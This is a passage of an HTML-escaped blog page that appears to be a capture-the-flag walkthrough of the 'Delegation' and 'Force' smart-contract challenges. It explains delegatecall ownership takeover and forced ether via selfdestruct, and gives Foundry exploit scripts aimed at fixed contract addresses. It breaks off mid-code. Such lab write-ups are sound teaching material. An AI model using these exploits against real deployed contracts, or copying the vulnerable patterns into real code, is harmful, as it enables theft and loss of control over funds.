&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;TokenSolve.s.sol:TokenSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;6-delegation&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#6-delegation&quot; aria-label=&quot;Anchor link for: 6-delegation&quot;&gt;6 Delegation&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;Delegation.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Delegate {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  address public owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(address _owner) {
&lt;&#x2F;span&gt;&lt;span&gt;    owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;pwn&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Delegation {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  address public owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  Delegate delegate&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(address _delegateAddress) {
&lt;&#x2F;span&gt;&lt;span&gt;    delegate &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Delegate&lt;&#x2F;span&gt;&lt;span&gt;(_delegateAddress)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;fallback&lt;&#x2F;span&gt;&lt;span&gt;() external {
&lt;&#x2F;span&gt;&lt;span&gt;    (bool result&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(delegate)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;delegatecall&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;data)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(result) {
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Claim ownership of Delegation contract&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;Delegation&lt;&#x2F;code&gt; contracts uses delegatecall to call the other contract &lt;code&gt;Delegate&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;One thing to remember with delegatecall is that it will maintain the &lt;code&gt;msg.sender&lt;&#x2F;code&gt; and &lt;code&gt;msg.value&lt;&#x2F;code&gt; when it calls other contract.&lt;&#x2F;li&gt;
&lt;li&gt;And also it updates the caller contract storage not the contract which being called.&lt;&#x2F;li&gt;
&lt;li&gt;So, when we call &lt;code&gt;pwn()&lt;&#x2F;code&gt; on the Delegation address it will forward the call to Delegate contract and updates the owner variable in Delegation contract.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;DelegationSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;Delegation.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract DelegationSolve is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    Delegation public delegation &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Delegation&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xFb9BeF4E9A8d68C2Bc2c4D2dE5688fbe0e8224F2&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Initial Owner : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;delegation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;owner&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(delegation)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodeWithSignature&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;pwn()&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Final Owner : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;delegation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;owner&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;DelegationSolve.s.sol:DelegationSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;7-force&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#7-force&quot; aria-label=&quot;Anchor link for: 7-force&quot;&gt;7 Force&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;Force.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Force {&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;*
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;                   MEOW ?
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;         &#x2F;\_&#x2F;\   &#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;    ____&#x2F; o o \
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;  &#x2F;~____  =√∏= &#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt; (______)__m_m)
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;*&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;We need to make the balance of the Force contract more than 0.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;There is no &lt;code&gt;receive()&#x2F;fallback()&lt;&#x2F;code&gt; function and no payable functions in the Force contract.&lt;&#x2F;li&gt;
&lt;li&gt;If we send any ether to this contract it will be reverted.&lt;&#x2F;li&gt;
&lt;li&gt;There are more ways to receive ether not just &lt;code&gt;receive()&#x2F;fallback()&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;Ether can be received via coinbase transaction, i.e a mining reward.&lt;&#x2F;li&gt;
&lt;li&gt;Also when someone called selfdestruct on any contract and mentioned our address in the recepient of the ether after selftdestruct.&lt;&#x2F;li&gt;
&lt;li&gt;So, we can deploy a contract with some ether and implement a selfdestruct function and pass the recepient as the &lt;code&gt;Force&lt;&#x2F;code&gt; contract address.&lt;&#x2F;li&gt;
&lt;li&gt;Upon selfdestruct of the Attack contract it Force contract will receive ether.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;code&gt;ForceSolve.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Force} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;Force.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract ForceSolve is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    Force public force &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Force&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xef1ec80b578969a99B840745178d655f3594Db99&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;envUint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;PRIVATE_KEY&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;balance of Force : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(force)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;{value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wei&lt;&#x2F;span&gt;&lt;span&gt;}()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(force)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;balance of Force : &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(force)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    address public owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() payable {
&lt;&#x2F;span&gt;&lt;span&gt;        owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address payable _fundReceiver&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;owner)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;selfdestruct&lt;&#x2F;span&gt;&lt;span&gt;(_fundReceiver)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
